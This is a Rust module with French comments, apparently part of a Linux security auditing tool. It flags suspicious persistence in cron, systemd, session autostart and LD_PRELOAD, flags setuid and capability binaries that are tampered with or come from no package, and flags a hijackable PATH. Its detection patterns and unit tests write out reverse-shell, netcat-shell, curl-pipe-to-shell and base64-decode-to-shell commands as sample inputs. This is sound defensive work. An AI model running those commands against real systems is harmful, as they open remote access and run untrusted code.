//! Ce qui se cache : persistance (préchargement, services, démarrage de session, cron), programmes
//! privilégiés hors paquet ou modifiés, PATH piégeable.

use super::*;

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
pub(super) fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
pub(super) fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
pub(super) fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
pub(super) fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
pub(super) fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    let mots: Vec<&str> = commande.split_whitespace().collect();
    let a = |m: &str| mots.iter().any(|x| x.trim_matches(|c| c == '"' || c == '\'') == m);
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    if (a("nc") || a("ncat") || a("netcat")) && (a("-e") || a("-c")) {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    if (commande.contains("curl") || commande.contains("wget"))
        && commande.split('|').skip(1).any(|suite| {
            let prog = suite.split_whitespace().next().unwrap_or("");
            ["sh", "bash", "zsh", "dash", "python", "python3", "perl"].contains(&prog.rsplit('/').next().unwrap_or(""))
        })
    {
        return Some(tr!(
            "télécharge un script et l'exécute aussitôt",
            "downloads a script and runs it right away"
        ));
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    if !lancement {
        return None;
    }
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! »).
    let programme = mots
        .first()?
        .trim_matches(|c| c == '"' || c == '\'')
        .trim_start_matches(['-', '@', '+', '!', ':']);
    if ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|d| programme.starts_with(d))
    {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let maison = home();
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        });
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.') && r.contains('/') && !DOSSIERS_CACHES_NORMAUX.contains(&premier) {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "exec-shutdown"].contains(&cle) {
            return Some(valeur.trim().to_string());
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        return (fin > debut).then(|| l[debut + 1..fin].to_string());
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
pub(super) fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne)
        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
        && !ligne.trim_start().starts_with("unset")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), sans suivre les liens d'activation.
pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
            trouve.extend(fichiers_de(&p, extensions));
        } else if t.is_file() && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
            trouve.push(p);
        }
    }
    trouve
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
pub(super) fn persistance() -> Vec<Constat> {
    const CAT: &str = "Persistance";
    let h = std::path::PathBuf::from(home());
    let gestion = Paquets::detecter();
    let mut critiques = Vec::new();
    let mut suspects = Vec::new();

    // /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris.
    // Technique classique des rootkits ; presque aucun système normal n'en a.
    if let Ok(texte) = std::fs::read_to_string("/etc/ld.so.preload") {
        for lib in texte
            .lines()
            .filter(|l| !commentaire(l))
            .flat_map(str::split_whitespace)
        {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            if connue {
                suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = std::env::var_os(var).filter(|v| !v.is_empty()) {
            suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                v.to_string_lossy()
            ));
        }
    }

    let mut configuration: Vec<std::path::PathBuf> = [
        "/etc/environment",
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/zsh/zshenv",
        "/etc/zsh/zprofile",
    ]
    .iter()
    .map(std::path::PathBuf::from)
    .collect();
    configuration.extend(fichiers_de(Path::new("/etc/profile.d"), &["sh", "zsh"]));
    configuration.extend(fichiers_de(Path::new("/etc/environment.d"), &["conf"]));
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".xprofile",
        ]
        .iter()
        .map(|f| h.join(f)),
    );
    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
    for f in std::fs::read_dir(h.join(".config/uwsm"))
        .into_iter()
        .flatten()
        .flatten()
    {
        if f.file_name().to_string_lossy().starts_with("env") && f.path().is_file() {
            configuration.push(f.path());
        }
    }

    // Fichiers dont des lignes lancent des programmes.
    let mut demarrage = fichiers_de(
        Path::new("/etc/systemd/system"),
        &["service", "timer", "socket", "path", "conf"],
    );
    demarrage.retain(|p| !p.is_symlink());
    demarrage.extend(fichiers_de(
        &h.join(".config/systemd/user"),
        &["service", "timer", "socket", "path", "conf"],
    ));
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(Path::new("/etc/xdg/autostart"), &["desktop"]));
    let hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
    demarrage.extend(hypr.iter().cloned());
    configuration.extend(hypr);

    let court = |p: &Path| {
        p.strip_prefix(&h)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display()))
    };
    for f in &configuration {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            if definit_prechargement(l) {
                suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f),
                    n + 1
                ));
            } else if !commentaire(l)
                && !demarrage.contains(f)
                && let Some(raison) = commande_suspecte(l, false)
            {
                suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f), n + 1));
            }
        }
    }
    for f in &demarrage {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            if let Some(raison) = commande_lancee(l).and_then(|c| commande_suspecte(&c, true)) {
                suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f), n + 1));
            }
        }
    }
    // crontab de l'utilisateur et du système : chaque ligne est une commande.
    let mut cron: Vec<(String, String)> = sortie("crontab", &["-l"])
        .unwrap_or_default()
        .lines()
        .map(|l| ("crontab".to_string(), l.to_string()))
        .collect();
    let mut fichiers_cron = vec![std::path::PathBuf::from("/etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir("/etc/cron.d")
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    for f in fichiers_cron {
        for l in std::fs::read_to_string(&f).unwrap_or_default().lines() {
            cron.push((f.display().to_string(), l.to_string()));
        }
    }
    for (source, l) in cron.iter().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
        }
    }

    let mut constats = Vec::new();
    suspects.sort();
    suspects.dedup();
    if critiques.is_empty() && suspects.is_empty() {
        constats.push(ok(
            CAT,
            tr!(
                "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
                "No suspicious autostart (preloading, services, session startup, cron)."
            ),
        ));
    } else {
        let niveau = if critiques.is_empty() {
            Niveau::Eleve
        } else {
            Niveau::Critique
        };
        let mut liste = critiques;
        liste.extend(suspects);
        let reste = liste.len().saturating_sub(6);
        liste.truncate(6);
        let mut message = trf!(
            "Lancement automatique suspect : {}",
            "Suspicious autostart: {}",
            liste.join(" ; ")
        );
        if reste > 0 {
            let _ = trw!(message, " ; et {reste} autre(s)", "; and {reste} more");
        }
        message.push('.');
        constats.push(alerte(CAT, niveau, message).manuel(
            tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que tu n'as pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
            &[],
        ));
    }

    // Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root.
    // On les nomme pour que tu les reconnaisses, sans baisser la note.
    if let Some(gestion) = gestion {
        let mut maison: Vec<String> = fichiers_de(Path::new("/etc/systemd/system"), &["service", "timer"])
            .into_iter()
            .filter(|p| p.parent() == Some(Path::new("/etc/systemd/system")) && !p.is_symlink())
            .filter(|p| !gestion.possede(p))
            .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
            .collect();
        maison.sort();
        if !maison.is_empty() {
            let premier = maison[0].clone();
            constats.push(
                alerte(
                    CAT,
                    Niveau::Info,
                    trf!(
                        "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
                        "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
                        maison.len(),
                        maison.join(", ")
                    ),
                )
                .manuel(
                    tr!(
                        "Si tu n'en reconnais pas un, lis ce qu'il lance avant de le désactiver",
                        "If you do not recognize one, read what it starts before turning it off"
                    ),
                    &[&format!("systemctl cat {premier}")],
                ),
            );
        }
    }
    constats
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
pub(super) fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
pub(super) fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::PermissionsExt;
    fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
            let p = e.path();
            if e.file_type().is_ok_and(|t| t.is_dir()) {
                if profondeur > 0 {
                    parcourir(&p, profondeur - 1, trouve, test);
                }
            } else if test(&p) {
                trouve.push(p);
            }
        }
    }
    use std::os::unix::fs::MetadataExt;
    let mut constats = Vec::new();
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (&home() as &str, 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    let capacites = sortie(
        "getcap",
        &[
            "-r",
            "/usr/bin",
            "/usr/sbin",
            "/usr/local",
            "/usr/lib",
            "/usr/libexec",
            "/opt",
            "/tmp",
            "/var/tmp",
            "/dev/shm",
        ],
    )
    .map(|s| fichiers_capacites(&s));
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let gestion = Paquets::detecter();
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    if let Some(gestion) = gestion {
        for p in &systeme {
            match gestion.proprietaire(p) {
                Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
                None => anormaux.push(p.clone()),
            }
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0);
    if let Some(gestion) = gestion {
        for (paquet, fichiers) in &par_paquet {
            for (f, etat) in fichiers.iter().zip(gestion.modifies(paquet, fichiers)) {
                match etat {
                    Some(true) => modifies.push((crate::ui::chemin_affichable(f), paquet.clone())),
                    Some(false) => {}
                    None => non_verifies += 1,
                }
            }
        }
    }
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        let reinstaller = gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default();
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Critique,
                trf!(
                    "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                    liste.join(", ")
                ),
            )
            .manuel(
                tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer tes mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
                &[&reinstaller],
            ),
        );
    }
    if !anormaux.is_empty() {
        // Dans un dossier temporaire, n'importe qui choisit le nom : montré (message et commandes à taper), il est
        // rendu inoffensif.
        let liste: Vec<String> = anormaux
            .iter()
            .take(10)
            .map(|p| crate::ui::chemin_affichable(p))
            .collect();
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                    liste.join(", ")
                ),
            )
            .manuel(
                tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
                &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
            ),
        );
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let n = systeme.len();
        let mut message = match (gestion, non_verifies) {
            (None, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (Some(_), 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (Some(_), k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if capacites.is_none() {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    let path = std::env::var("PATH").unwrap_or_default();
    let dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),         // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/gardien surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }
}
